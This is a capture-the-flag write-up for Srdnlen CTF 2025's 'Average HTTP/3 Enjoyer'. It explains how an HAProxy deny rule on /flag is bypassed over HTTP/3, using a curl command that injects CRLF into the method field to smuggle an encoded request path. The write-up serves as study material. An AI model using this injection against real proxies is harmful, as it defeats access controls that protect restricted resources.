---
title: "Average HTTP/3 Enjoyer - Srdnlen CTF 2025 Quals"
category: "web"
type: "writeup"
tags: ["web", "http3", "average", "http", "enjoyer", "srdnlen-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "As seen in the description of the challenge, there is a /flag route."
source:
  name: "CTFtime writeup #39822"
  url: "https://ctftime.org/writeup/39822"
ctf:
  name: "Srdnlen CTF 2025 Quals"
  year: 2025
  challenge: "Average HTTP/3 Enjoyer"
---

## Metadata

- **CTF:** Srdnlen CTF 2025 Quals
- **Task:** Average HTTP/3 Enjoyer
- **Author team:** aetruria
- **CTFtime tags:** web, http3
- **CTFtime:** <https://ctftime.org/writeup/39822>

---
### Challenge Description

> HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer. NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so. In chrome you can do the following: chrome --enable-quic --origin-to-force-quic-on=[enjoyer.challs.ctf.srdnlen.it](http://enjoyer.challs.ctf.srdnlen.it)

### Initial Analysis  
As seen in the description of the challenge, there is a `/flag` route. Trying a simple curl command:

```bash  
curl <https://enjoyer.challs.ctf.srdnlen.it/flag>  
```

it was not possible to reach the route since it uses HTTP/3. However, with curl, you can specify the `--http3` flag to use version 3 of HTTP. But when trying:

```bash  
curl --http3 <https://enjoyer.challs.ctf.srdnlen.it/flag>  
```

it returned a 403 Forbidden error due to a proxy rule set by HAProxy. In fact, as we can see from the attached files, specifically in the `haproxy.cfg` file, the following rule is specified:

```  
acl restricted_flag path_sub,url_dec -m sub -i /flag  
http-request deny if restricted_flag  
```

This denies all requests containing the `/flag` route. Therefore, it is a 403 bypass challenge. 

### Exploit  
This challenge can be solved by URL encoding `/flag` and specifying a header. I found the explanation and exploit on [StackOverflow](<https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066):>

```bash  
echo "\n"; curl --insecure -X "$(echo -en 'GET %2fflag 1/\r\nX-Ignore-Injection:')" <https://enjoyer.challs.ctf.srdnlen.it> \--http3  
```  
### Flag

```  
srdnlen{you_found_the_:path_for_becoming_a_real_http3_enjoyer}  
```
